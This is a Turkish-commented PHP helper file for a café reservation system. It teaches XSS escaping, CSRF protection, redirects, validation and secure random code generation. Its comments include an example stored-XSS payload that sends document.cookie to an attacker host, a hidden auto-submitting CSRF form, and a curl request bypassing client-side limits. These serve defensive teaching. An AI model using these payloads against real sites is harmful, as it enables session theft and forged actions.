<?php
/**
 * =====================================================================
 *  KAFE MASA REZERVASYON SISTEMI - YARDIMCI FONKSIYONLAR
 * ---------------------------------------------------------------------
 *  Bu dosyada is mantigi YOKTUR. Burada, projenin her yerinde tekrar
 *  eden kucuk islemler toplanir: cikti kacislama, CSRF, flash mesaj,
 *  yonlendirme, girdi okuma ve dogrulama.
 *
 *  Neden ayri bir dosya? Ayni kurali (ornegin telefon normalizasyonu)
 *  uc ayri sayfada kopyalarsaniz, birinde 10 haneye indirip digerinde
 *  indirmeyi unutursunuz; ayni musteri veritabaninda iki farkli
 *  telefonla gorunur. Tek fonksiyon = tek dogru davranis.
 * =====================================================================
 */

if (!defined('APP_INIT')) {
    http_response_code(403);
    die('Dogrudan erisim engellendi.');
}


// =====================================================================
// 1) CIKTI GUVENLIGI  (XSS)
// =====================================================================

/**
 * e() = "escape". HTML'e basilacak HER degeri bundan gecirin.
 *
 * ---------------------------------------------------------------------
 * SALDIRI: Musteri "musteri_adi" alanina su metni yazar:
 *     <script>fetch('http://kotu.site/c?x='+document.cookie)</script>
 * Admin paneli bu ismi kacislamadan ekrana basarsa, ADMIN'in
 * tarayicisinda calisir ve admin'in oturum cerezi saldirgana gider.
 * Buna "stored XSS" denir; en tehlikeli turudur, cunku kurbanin bir
 * baglantiya tiklamasi bile gerekmez.
 *
 * COZUM: htmlspecialchars, ozel karakterleri HTML varliklarina cevirir:
 *     <  ->  &lt;      >  ->  &gt;
 *     "  ->  &quot;    '  ->  &#039;      &  ->  &amp;
 * Boylece tarayici o metni ETIKET degil, YAZI olarak gorur. Kullanici
 * ekranda yine "<script>..." yazisini okur; veri bozulmaz, sadece
 * calismaz.
 *
 * ---------------------------------------------------------------------
 * NEDEN "KAYIT ANINDA" DEGIL DE "CIKTI ANINDA" KACISLIYORUZ?
 *
 * Yaygin fakat yanlis yaklasim: veriyi veritabanina yazarken
 * htmlspecialchars uygulamak (eski PHP'deki "magic quotes" mantigi).
 * Sorunlari:
 *   1. Veritabaninda artik gercek veri degil, HTML'e ozel bir kopya
 *      durur. "Ali & Veli" ismi "Ali &amp; Veli" olarak saklanir.
 *   2. Ayni veriyi JSON API'de, PDF faturada, SMS'te veya e-postada
 *      kullaninca "&amp;" oldugu gibi gorunur. Cunku o ortamlarda HTML
 *      kacislamasinin bir anlami yoktur.
 *   3. Iki kez kacislama riski: bir gun cikti tarafina da e() eklenir ve
 *      isim "Ali &amp;amp; Veli" olur.
 *   4. En onemlisi: kacislama HEDEFE gore degisir. HTML govdesi,
 *      HTML attribute'u, JavaScript ve URL icin farkli kurallar
 *      gerekir. Kayit aninda hangi hedefe gidecegini bilemezsiniz.
 *
 * Dogru ilke: VERIYI OLDUGU GIBI SAKLA, CIKTI ALIRKEN HEDEFE GORE
 * KACISLA. (escape on output)
 *
 * ---------------------------------------------------------------------
 * PARAMETRELER
 *   ENT_QUOTES    : Hem cift (") hem tek (') tirnagi kacislar.
 *                   Tek tirnak sart; cunku attribute'lar tek tirnakla
 *                   da yazilabilir:
 *                     <input value='<?= e($ad) ?>'>
 *                   ENT_QUOTES olmasa saldirgan tek tirnakla
 *                   attribute'tan cikip onerror=... ekleyebilirdi.
 *   ENT_SUBSTITUTE: Gecersiz UTF-8 baytlarini "?" ile degistirir.
 *                   Varsayilan davranis BOS METIN dondurmekti; yani
 *                   bozuk bayt iceren bir isim ekranda tamamen kaybolur,
 *                   hata da vermezdi. Bu sessiz veri kaybini onler.
 *   'UTF-8'       : Karakter setini acikca belirtmek, PHP surumleri
 *                   arasindaki varsayilan farklarindan korur.
 */
function e(mixed $deger): string
{
    if ($deger === null) {
        return '';
    }

    return htmlspecialchars((string) $deger, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

/**
 * URL parcasina deger gomerken kullanilir:
 *     <a href="rezervasyon-sorgula.php?kod=<?= u($kod) ?>">
 * e() burada yetmez: "&" ve bosluk gibi karakterlerin URL anlami vardir,
 * HTML anlami degil. Her baglam kendi kacislamasini ister.
 */
function u(mixed $deger): string
{
    return rawurlencode((string) $deger);
}


// =====================================================================
// 2) CSRF KORUMASI
// ---------------------------------------------------------------------
// CSRF = Cross-Site Request Forgery (siteler arasi istek sahteciligi).
//
// SENARYO:
//   1. Admin, panele giris yapar. Tarayicisinda oturum cerezi olusur.
//   2. Admin ayni tarayicida baska bir sekmede kotu bir siteyi acar.
//   3. O sitede gorunmez bir form vardir:
//        <form action="http://localhost/kafe-rezervasyon/admin/masalar.php"
//              method="post">
//          <input type="hidden" name="islem"  value="sil">
//          <input type="hidden" name="masa_id" value="3">
//        </form>
//        <script>document.forms[0].submit();</script>
//   4. Tarayici bu istegi gonderirken, hedef adres bizim sitemiz oldugu
//      icin BIZIM cerezimizi de otomatik ekler. Sunucu acisindan istek
//      giris yapmis admin'den gelmis gibi gorunur ve masa silinir.
//
// Dikkat: Saldirganin cerezi OKUMASI gerekmez. Tarayicinin cerezi
// kendiliginden eklemesi yeterlidir. Bu yuzden "giris kontrolu var"
// demek CSRF'e karsi koruma saglamaz.
//
// COZUM: Her formda, sunucunun uretip SESSION'da tuttugu rastgele bir
// token bulunur. Saldirganin sitesi bizim sayfamizin HTML'ini okuyamaz
// (Same-Origin Policy engeller), dolayisiyla token'i bilemez. Token'siz
// veya yanlis token'li istek reddedilir.
// =====================================================================

/**
 * Oturuma ait CSRF token'ini dondurur; yoksa uretir.
 *
 * random_bytes(32) kriptografik olarak guvenli rastgelelik uretir
 * (isletim sisteminin CSPRNG'sinden okur). 32 bayt = 256 bit; bin2hex
 * ile 64 karakterlik onaltilik metne cevrilir. Tahmin edilmesi pratikte
 * imkansizdir.
 *
 * Token oturum basina bir kez uretilir. Her istekte yenilemek de bir
 * yontemdir ama kullanici iki sekmede iki form actiginda eskisi gecersiz
 * olur ve "oturum hatasi" alir. Oturum basina tek token, bu proje
 * olceginde dogru dengedir.
 */
function csrf_token(): string
{
    if (empty($_SESSION[CSRF_SESSION_ANAHTARI])) {
        $_SESSION[CSRF_SESSION_ANAHTARI] = bin2hex(random_bytes(32));
    }

    return $_SESSION[CSRF_SESSION_ANAHTARI];
}

/**
 * Forma dogrudan basilabilen hazir gizli alan.
 *
 * Kullanimi:
 *     <form method="post">
 *         <?= csrf_field() ?>
 *         ...
 *     </form>
 *
 * Token e() ile kacislanir. Token zaten sadece [0-9a-f] karakterlerinden
 * olusur, yani teknik olarak gerek yoktur; ama "HTML'e basilan her deger
 * kacislanir" kuralini istisnasiz uygulamak iyi bir aliskanliktir.
 */
function csrf_field(): string
{
    return '<input type="hidden" name="' . CSRF_ALAN_ADI . '" value="' . e(csrf_token()) . '">';
}

/**
 * Gelen token'i oturumdakiyle karsilastirir.
 *
 * ---------------------------------------------------------------------
 * NEDEN hash_equals, NEDEN === DEGIL?
 *
 * PHP'nin === operatoru metinleri karakter karakter karsilastirir ve
 * ILK FARKLI KARAKTERDE durur. Yani:
 *     "aaaa...": 1. karakterde durur  -> cok hizli
 *     "9f3a...": 4. karakterde durur  -> biraz daha yavas
 * Aradaki fark nanosaniye duzeyindedir, ama saldirgan ayni denemeyi
 * binlerce kez yapip ortalama alirsa bu fark olculebilir hale gelir.
 * Boylece token'i karakter karakter tahmin edebilir. Buna ZAMANLAMA
 * SALDIRISI (timing attack) denir.
 *
 * hash_equals() iki metni HER ZAMAN ayni surede karsilastirir (sabit
 * zamanli karsilastirma): fark bulsa bile erken cikmaz. Boylece gecen
 * sure hicbir bilgi sizdirmaz.
 *
 * Ayni sebeple sifre hash'leri de === ile degil password_verify() ile
 * karsilastirilir; o fonksiyon da icinde sabit zamanli karsilastirma
 * kullanir.
 * ---------------------------------------------------------------------
 *
 * @param string|null $gonderilen Bos birakilirsa $_POST'tan okunur.
 */
function csrf_dogrula(?string $gonderilen = null): bool
{
    if ($gonderilen === null) {
        $gelen = $_POST[CSRF_ALAN_ADI] ?? '';
        // Saldirgan "_token[]=x" gonderip dizi enjekte edebilir;
        // hash_equals dizi alinca TypeError firlatir. Once tur kontrolu.
        $gonderilen = is_string($gelen) ? $gelen : '';
    }

    $beklenen = $_SESSION[CSRF_SESSION_ANAHTARI] ?? '';

    // Oturumda token yoksa (session dusmus olabilir) dogrulama basarisiz
    // sayilir. "Token yoksa gecerli kabul et" gibi bir kolaylik, korumayi
    // tamamen ise yaramaz hale getirirdi.
    if ($beklenen === '' || $gonderilen === '') {
        return false;
    }

    return hash_equals($beklenen, $gonderilen);
}

/**
 * POST isteklerinde tek satirlik koruma:
 *     csrf_kontrol_et();   // gecersizse istek burada olur
 *
 * 419 kodu resmi bir HTTP kodu degildir ama "oturum/token suresi doldu"
 * anlaminda yaygin olarak kullanilir (Laravel de bunu kullanir).
 */
function csrf_kontrol_et(): void
{
    if (!csrf_dogrula()) {
        http_response_code(419);
        die('Guvenlik dogrulamasi basarisiz. Sayfayi yenileyip tekrar deneyin.');
    }
}


// =====================================================================
// 3) FLASH MESAJLAR
// ---------------------------------------------------------------------
// Flash mesaj = SADECE BIR KEZ gosterilip silinen bildirim.
//
// Neden gerekli? Form gonderildikten sonra "POST -> yonlendir -> GET"
// desenini uyguluyoruz (bkz. yonlendir). Yonlendirme yapinca PHP degiskenleri
// kaybolur; "Rezervasyonunuz alindi" mesajini yeni sayfaya tasimanin yolu
// onu session'a birakmaktir. Gosterildikten sonra silinmezse mesaj her
// sayfa yenilemede tekrar cikar.
// =====================================================================

/**
 * @param string $tip Bootstrap alert turu: success | danger | warning | info
 */
function flash_ekle(string $mesaj, string $tip = 'success'): void
{
    // Beyaz liste: tip degeri dogrudan HTML class'ina yazilacak.
    // Serbest birakilsaydi "danger\"><script>..." gibi bir deger
    // attribute'tan cikip XSS'e donusebilirdi.
    $izinli = ['success', 'danger', 'warning', 'info'];
    if (!in_array($tip, $izinli, true)) {
        $tip = 'info';
    }

    $_SESSION['flash'][] = ['tip' => $tip, 'mesaj' => $mesaj];
}

/**
 * Bekleyen mesajlari Bootstrap alert HTML'i olarak dondurur ve KUYRUGU
 * TEMIZLER. Kuyrugu okuduktan hemen sonra silmek, mesajin ikinci kez
 * gorunmesini engeller.
 */
function flash_goster(): string
{
    if (empty($_SESSION['flash'])) {
        return '';
    }

    $mesajlar = $_SESSION['flash'];
    unset($_SESSION['flash']);

    $html = '';
    foreach ($mesajlar as $flash) {
        $html .= '<div class="alert alert-' . e($flash['tip']) . ' alert-dismissible fade show" role="alert">'
            . e($flash['mesaj'])
            . '<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Kapat"></button>'
            . '</div>';
    }

    return $html;
}


// =====================================================================
// 4) YONLENDIRME
// =====================================================================

/**
 * Tarayiciyi baska bir adrese gonderir.
 *
 * ---------------------------------------------------------------------
 * NEDEN header()'dan SONRA exit ZORUNLU?
 *
 * header('Location: ...') sadece yanita bir BASLIK ekler; PHP betigini
 * durdurmaz. exit yazmazsaniz alttaki kodlar calismaya devam eder:
 *
 *     YANLIS:
 *         if (!giris_yapildi_mi()) {
 *             header('Location: login.php');
 *         }
 *         // ...burasi yine de calisir!
 *         Database::execute('DELETE FROM masalar WHERE id = ?', [$id]);
 *
 * Tarayici genelde yonlendirmeye uyup govdeyi gostermez, ama SUNUCUDA
 * silme islemi coktan yapilmistir. Ayrica curl gibi araclar govdeyi
 * okur; yani yetkisiz kullaniciya veri sizabilir.
 *
 * Kisacasi header('Location') bir "oneri", exit ise "kesin durdurma"dir.
 * ---------------------------------------------------------------------
 *
 * 303 See Other: POST sonrasi yonlendirmede dogru koddur. Tarayiciya
 * "yeni adrese GET ile git" der; boylece kullanici F5'e bastiginda form
 * yeniden gonderilmez (cift rezervasyon olusmaz).
 */
function yonlendir(string $url, int $kod = 303): never
{
    // Basliklar zaten gonderildiyse (ornegin daha once echo yapildiysa)
    // header() calismaz. O durumda tarayici tarafi yedek plan devreye girer.
    if (headers_sent()) {
        echo '<meta http-equiv="refresh" content="0;url=' . e($url) . '">';
        echo '<script>location.replace(' . json_encode($url) . ');</script>';
        exit;
    }

    header('Location: ' . $url, true, $kod);
    exit;
}


// =====================================================================
// 5) GIRDI OKUMA
// ---------------------------------------------------------------------
// $_POST['ad'] dogrudan kullanilirsa, alan gonderilmediginde
// "Undefined array key" uyarisi alinir. Bu fonksiyonlar hem varsayilan
// deger verir hem de bas/son bosluklari temizler.
//
// NOT: Buradaki temizlik GUVENLIK DEGILDIR. Guvenlik iki yerde saglanir:
//   - SQL'e giderken  -> prepared statement (db.php)
//   - HTML'e giderken -> e() (yukarida)
// trim sadece "  Ahmet  " ile "Ahmet" ayni kayit olsun diyedir.
// =====================================================================

function post(string $anahtar, string $varsayilan = ''): string
{
    $deger = $_POST[$anahtar] ?? $varsayilan;

    // Saldirgan "ad[]=x" gondererek dizi enjekte edebilir; trim() diziyi
    // kabul etmez ve TypeError firlatir. Tur kontrolu bunu engeller.
    return is_string($deger) ? trim($deger) : $varsayilan;
}

function get(string $anahtar, string $varsayilan = ''): string
{
    $deger = $_GET[$anahtar] ?? $varsayilan;

    return is_string($deger) ? trim($deger) : $varsayilan;
}

/**
 * Sayisal girdiler icin. Aralik disi degerler sinira cekilir (clamp).
 * Ornek: kisi_sayisi olarak 999 gelirse MAX_KISI_SAYISI'na indirilir.
 */
function post_int(string $anahtar, int $varsayilan = 0, ?int $min = null, ?int $max = null): int
{
    $deger = (int) post($anahtar, (string) $varsayilan);

    if ($min !== null && $deger < $min) {
        $deger = $min;
    }
    if ($max !== null && $deger > $max) {
        $deger = $max;
    }

    return $deger;
}

/**
 * Istek POST ile mi geldi? Form isleyen sayfalarin ilk kontrolu.
 */
function post_istegi_mi(): bool
{
    return ($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST';
}


// =====================================================================
// 6) DOGRULAMA (VALIDATION)
// =====================================================================

/**
 * Telefonu yalin 10 haneye indirger: 0555 111 22 33 -> 5551112233
 *
 * NEDEN NORMALIZE EDIYORUZ?
 * Ayni numara kullanicidan su sekillerde gelebilir:
 *     0555 111 22 33 / +90 555 111 22 33 / (0555) 111-22-33 / 05551112233
 * Bunlari oldugu gibi saklarsak, musteri "rezervasyonumu telefonla
 * sorgula" dediginde kendi kaydini bulamaz; cunku metin karsilastirmasi
 * birebir calisir. Tek bir kanonik bicim = guvenilir arama.
 *
 * \D : rakam OLMAYAN her karakter. preg_replace ile hepsi silinir.
 */
function telefon_normalize(string $telefon): string
{
    $rakamlar = preg_replace('/\D+/', '', $telefon) ?? '';

    // Uluslararasi onekleri temizle: 0090... ve 90...
    if (str_starts_with($rakamlar, '0090')) {
        $rakamlar = substr($rakamlar, 4);
    } elseif (strlen($rakamlar) === 12 && str_starts_with($rakamlar, '90')) {
        $rakamlar = substr($rakamlar, 2);
    }

    // Bastaki 0 ve arta kalan her sey kirpilir; son 10 hane alinir.
    if (strlen($rakamlar) > 10) {
        $rakamlar = substr($rakamlar, -10);
    }

    return $rakamlar;
}

/**
 * Normalize edilmis numaranin gecerli bir Turkiye cep numarasi olup
 * olmadigini kontrol eder: 10 hane ve 5 ile baslar (5XX XXX XX XX).
 */
function gecerli_telefon(string $telefon): bool
{
    $normal = telefon_normalize($telefon);

    return strlen($normal) === 10 && $normal[0] === '5';
}

/**
 * E-posta dogrulama.
 *
 * Kendi regex'inizi yazmayin. Gecerli e-posta adresi tanimi (RFC 5322)
 * sanildigindan cok daha karmasiktir; elle yazilan desenler ya gecerli
 * adresleri reddeder ya da gecersizleri kabul eder. filter_var bu isi
 * PHP cekirdeginde, test edilmis bir uygulama ile yapar.
 *
 * Not: Bu kontrol adresin BICIMINI dogrular, VAR OLDUGUNU degil. Gercek
 * dogrulama ancak adrese kod gonderip onaylatmakla yapilir.
 */
function gecerli_email(string $email): bool
{
    return $email !== ''
        && strlen($email) <= 120                       // kolon boyutuyla uyumlu
        && filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

/**
 * Tarih dogrulama. Varsayilan bicim: YYYY-AA-GG (MySQL DATE ile ayni).
 *
 * ---------------------------------------------------------------------
 * NEDEN sadece regex YETMEZ?
 * "/^\d{4}-\d{2}-\d{2}$/" deseni "2026-02-30" ve "2026-13-45" degerlerini
 * de kabul eder. Bicim dogrudur ama boyle bir GUN YOKTUR.
 *
 * DateTime::createFromFormat gercek bir takvim hesabi yapar. Ancak tek
 * basina o da yetmez: PHP tasan degerleri sessizce ileri sarar.
 *     '2026-02-30' -> 2026-03-02 nesnesi doner (false DEGIL!)
 *
 * Bu yuzden asagidaki "geri cevirip karsilastirma" hilesini kullaniyoruz:
 * nesneyi ayni bicimde metne cevirdigimizde girdiyle BIREBIR ayni degilse,
 * PHP degeri duzeltmis demektir -> tarih gecersizdir.
 *
 * Bastaki '!' karakteri: formatta bulunmayan alanlari (saat, dakika)
 * "simdiki zaman" yerine SIFIRLAR. Olmazsa nesne gunun saatini tasir ve
 * gece yarisina yakin calisan testlerde beklenmedik sonuclar dogar.
 * ---------------------------------------------------------------------
 */
function gecerli_tarih(string $tarih, string $bicim = 'Y-m-d'): bool
{
    if ($tarih === '') {
        return false;
    }

    $nesne = DateTime::createFromFormat('!' . $bicim, $tarih);

    return $nesne !== false && $nesne->format($bicim) === $tarih;
}

/**
 * Saat dogrulama. Varsayilan bicim 'H:i' (24 saat, 00:00 - 23:59).
 * MySQL'den gelen '19:00:00' gibi degerler icin bicim 'H:i:s' verilir.
 */
function gecerli_saat(string $saat, string $bicim = 'H:i'): bool
{
    if ($saat === '') {
        return false;
    }

    $nesne = DateTime::createFromFormat('!' . $bicim, $saat);

    return $nesne !== false && $nesne->format($bicim) === $saat;
}

/**
 * Saati gece yarisindan itibaren dakikaya cevirir: '19:30' -> 1170
 *
 * Saatleri METIN olarak karsilastirmak ('09:00' < '10:00') sifir dolgulu
 * oldugu surece calisir; ama '9:00' gibi tek haneli bir deger geldiginde
 * bozulur ve uzerine dakika eklemek (sure hesabi) imkansizdir. Sayiya
 * cevirmek her iki sorunu da kokten cozer.
 */
function saati_dakikaya_cevir(string $saat): int
{
    $parca = explode(':', $saat);
    $sa = isset($parca[0]) ? (int) $parca[0] : 0;
    $dk = isset($parca[1]) ? (int) $parca[1] : 0;

    return $sa * 60 + $dk;
}

/**
 * Dakikayi saat metnine cevirir: 1170 -> '19:30'
 */
function dakikayi_saate_cevir(int $dakika): string
{
    return sprintf('%02d:%02d', intdiv($dakika, 60), $dakika % 60);
}

/**
 * Verilen saat kafenin calisma araliginda mi?
 *
 * Bu kontrol SUNUCU tarafinda yapilmak zorundadir. Formdaki <select>
 * sadece 09:00-23:00 arasini gosterse bile, biri su komutu calistirip
 * gece 03:00'e rezervasyon atabilir:
 *     curl -d "saat=03:00&..." http://localhost/kafe-rezervasyon/index.php
 * Tarayicidan gelen HICBIR veriye guvenilmez.
 *
 * $bitisDahil = false: bitis saatinin kendisi disaridir. Kapanis 23:00
 * ise 23:00'te BASLAYAN rezervasyon kabul edilmez; ama 23:00'te BITEN
 * rezervasyon icin bu fonksiyon $bitisDahil = true ile cagrilir.
 */
function saat_araliginda_mi(
    string $saat,
    string $baslangic = KAFE_ACILIS,
    string $bitis = KAFE_KAPANIS,
    bool $bitisDahil = false
): bool {
    if (!gecerli_saat($saat)) {
        return false;
    }

    $d   = saati_dakikaya_cevir($saat);
    $bas = saati_dakikaya_cevir($baslangic);
    $bit = saati_dakikaya_cevir($bitis);

    return $d >= $bas && ($bitisDahil ? $d <= $bit : $d < $bit);
}

/**
 * Acilis ve kapanis arasindaki saat seceneklerini uretir.
 * Formdaki <select> bu diziden doldurulur.
 *
 * Son slot'un uzerine rezervasyon suresi eklenince kapanisi asmamasi
 * gerekir: 23:00 kapanis ve 120 dakika sure icin en son secenek 21:00'dir.
 */
function saat_secenekleri(
    int $adimDakika = SLOT_DAKIKA,
    int $sureDakika = REZERVASYON_SURESI_DAKIKA
): array {
    $bas = saati_dakikaya_cevir(KAFE_ACILIS);
    $bit = saati_dakikaya_cevir(KAFE_KAPANIS) - $sureDakika;

    $liste = [];
    for ($d = $bas; $d <= $bit; $d += $adimDakika) {
        $liste[] = dakikayi_saate_cevir($d);
    }

    return $liste;
}

/**
 * Tarih bugunden once mi? Gecmise rezervasyon alinmasini engeller.
 * Karsilastirma METIN uzerinden yapilir; 'Y-m-d' bicimi sifir dolgulu
 * oldugu icin sozlukte siralama = takvimde siralama olur.
 */
function gecmis_tarih_mi(string $tarih): bool
{
    return $tarih < date('Y-m-d');
}

/**
 * Tarih, izin verilen ileri tarih penceresinin icinde mi?
 */
function rezervasyon_penceresinde_mi(string $tarih): bool
{
    if (!gecerli_tarih($tarih)) {
        return false;
    }

    $sonTarih = date('Y-m-d', strtotime('+' . MAX_ILERI_GUN . ' days'));

    return !gecmis_tarih_mi($tarih) && $tarih <= $sonTarih;
}


// =====================================================================
// 7) REZERVASYON KODU URETIMI
// =====================================================================

/**
 * Kodda kullanilacak alfabe.
 *
 * Cikarilan karakterler ve sebepleri:
 *   0 / O : telefonda okunurken ve elle yazilirken karisir
 *   1 / I : ayni sekilde (bazi fontlarda ayirt edilemez)
 *   Kucuk harf yok: musteri kodu "rz7k4m2q" yazdiginda da bulabilsin
 *   diye her sey buyuk harf; boylece buyuk/kucuk harf karmasasi olmaz.
 *
 * Alfabe uzunlugu tam 32 karakterdir. Bu bir SECIM DEGIL, HESAPTIR -
 * asagidaki modulo aciklamasina bakin.
 */
const REZERVASYON_KODU_ALFABESI = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';

/**
 * Musteriye verilecek takip kodunu uretir. Ornek: RZ7K4M2Q
 *
 * ---------------------------------------------------------------------
 * NEDEN rand() / mt_rand() / uniqid() DEGIL?
 *
 * rand() ve mt_rand() "sozde rastgele" (pseudo-random) uretecleridir.
 * Dizinin tamami tek bir baslangic degerinden (seed) tureler. Mersenne
 * Twister'da 624 ardisik ciktiyi goren biri IC DURUMU cozup SONRAKI TUM
 * degerleri hesaplayabilir. Rezervasyon kodlari zaten musterilere
 * dagitildigi icin saldirganin ornek toplamasi cok kolaydir.
 *
 * uniqid() daha da kotudur: ciktisi aslinda MIKROSANIYE cinsinden
 * ZAMAN damgasidir. Rastgele degildir, sadece "benzersiz"dir. Iki
 * rezervasyonun kodlarini yan yana koyan biri aradaki kodlari tahmin
 * edebilir.
 *
 * Neden onemli? Kod, musterinin kimlik dogrulamasi yerine geciyor:
 * kodu bilen kisi o rezervasyonu goruntuleyebilir ve IPTAL EDEBILIR.
 * Tahmin edilebilir kod = baskasinin rezervasyonunu iptal edebilmek.
 *
 * random_bytes() ise isletim sisteminin kriptografik rastgelelik
 * kaynagindan okur (Linux: getrandom, Windows: CryptGenRandom). Cikti
 * ongorulemezdir ve gecmis degerlerden gelecek degerler turetilemez.
 *
 * ---------------------------------------------------------------------
 * NEDEN ALFABE 32 KARAKTER? (modulo yanliligi / modulo bias)
 *
 * Bir bayt 0-255 arasi 256 farkli deger alir. Bu bayti alfabeye
 * esleyebilmek icin modulo aliriz: ord($bayt) % alfabe_uzunlugu.
 *
 * Alfabe 32 olursa: 256 / 32 = 8, KALANSIZ. Her harfe tam olarak 8
 * bayt degeri duser -> her harfin cikma olasiligi esittir.
 *
 * Alfabe ornegin 33 olsaydi: 256 = 33*7 + 25. Ilk 25 harf 8 kez,
 * kalan 8 harf 7 kez temsil edilirdi. Yani bazi harfler %14 daha sik
 * cikardi. Bu yanlilik, kodun gercek rastgeleligini dusurur ve tahmin
 * saldirisini kolaylastirir. 2'nin kuvveti olan bir alfabe uzunlugu
 * secerek sorunu tamamen ortadan kaldiriyoruz.
 *
 * ---------------------------------------------------------------------
 * CAKISMA OLASILIGI
 * 32^8 = 1.099.511.627.776 (~1.1 trilyon) olasi kod vardir. Veritabanindaki
 * uq_rezervasyon_kodu UNIQUE indeksi, astronomik olasilikli bir cakismayi
 * da yakalar: INSERT hata verir, Adim 3'te yeni kod uretip tekrar deneriz.
 */
function rezervasyon_kodu_uret(int $uzunluk = 8): string
{
    $alfabe = REZERVASYON_KODU_ALFABESI;
    $boyut  = strlen($alfabe);          // 32

    $baytlar = random_bytes($uzunluk);
    $kod     = '';

    for ($i = 0; $i < $uzunluk; $i++) {
        // ord() bayti 0-255 sayisina cevirir; % $boyut onu alfabe
        // indeksine indirir. 256 % 32 == 0 oldugu icin yanlilik yoktur.
        $kod .= $alfabe[ord($baytlar[$i]) % $boyut];
    }

    return $kod;
}


// =====================================================================
// 8) GORUNUM YARDIMCILARI
// ---------------------------------------------------------------------
// Veritabanindaki ENUM degerleri makine icindir: 'onaylandi', 'iptal',
// 'tamamlandi'. Kullaniciya gosterilecek metin ve renk ise arayuz
// kararidir. Bu esleme tek yerde durur; Adim 3 ve 4'te hem musteri hem
// admin ekrani ayni fonksiyonlari cagirir, boylece "iptal" bir sayfada
// kirmizi digerinde gri gorunmez.
// =====================================================================

/**
 * ENUM degerini kullaniciya gosterilecek etikete cevirir.
 *
 * match ifadesi switch'ten farkli olarak SIKI karsilastirma (===) yapar
 * ve hicbir dal eslesmezse (default yoksa) hata firlatir. Burada
 * bilinmeyen bir deger gelirse "Bilinmiyor" diyoruz: veritabanina
 * ileride yeni bir ENUM degeri eklenirse sayfa cokmesin.
 */
function durum_etiketi(string $durum): string
{
    return match ($durum) {
        'onaylandi'  => 'Onaylandi',
        'iptal'      => 'Iptal Edildi',
        'tamamlandi' => 'Tamamlandi',
        default      => 'Bilinmiyor',
    };
}

/**
 * ENUM degerini Bootstrap 5 renk adina cevirir.
 * Kullanimi: <span class="badge bg-<?= durum_rengi($r['durum']) ?>">
 *
 * Donen degerler sabit bir listeden gelir; kullanicidan gelen deger
 * dogrudan class'a yazilmaz. Bu, "class enjeksiyonu" ile sayfanin
 * gorunumunun bozulmasini da engeller.
 */
function durum_rengi(string $durum): string
{
    return match ($durum) {
        'onaylandi'  => 'success',    // yesil
        'iptal'      => 'danger',     // kirmizi
        'tamamlandi' => 'secondary',  // gri
        default      => 'light',
    };
}

/**
 * Ikisini birlestiren kisayol: hazir Bootstrap rozeti dondurur.
 */
function durum_rozeti(string $durum): string
{
    return '<span class="badge bg-' . durum_rengi($durum) . '">'
        . e(durum_etiketi($durum))
        . '</span>';
}

/**
 * '2026-09-30' -> '30.09.2026'
 * Veritabani ISO bicimini (siralanabilir olsun diye) saklar; kullaniciya
 * Turkiye'de alisilmis bicimde gosteririz.
 */
function tarih_goster(string $tarih): string
{
    $nesne = DateTime::createFromFormat('!Y-m-d', substr($tarih, 0, 10));

    return $nesne === false ? $tarih : $nesne->format('d.m.Y');
}

/**
 * '19:00:00' -> '19:00'  (MySQL TIME kolonu saniyeyi de dondurur)
 */
function saat_goster(string $saat): string
{
    return substr($saat, 0, 5);
}

/**
 * '5551112233' -> '0555 111 22 33'
 */
function telefon_goster(string $telefon): string
{
    $n = telefon_normalize($telefon);

    if (strlen($n) !== 10) {
        return $telefon;   // beklenmedik bicim: oldugu gibi goster
    }

    return '0' . substr($n, 0, 3) . ' ' . substr($n, 3, 3) . ' '
        . substr($n, 6, 2) . ' ' . substr($n, 8, 2);
}
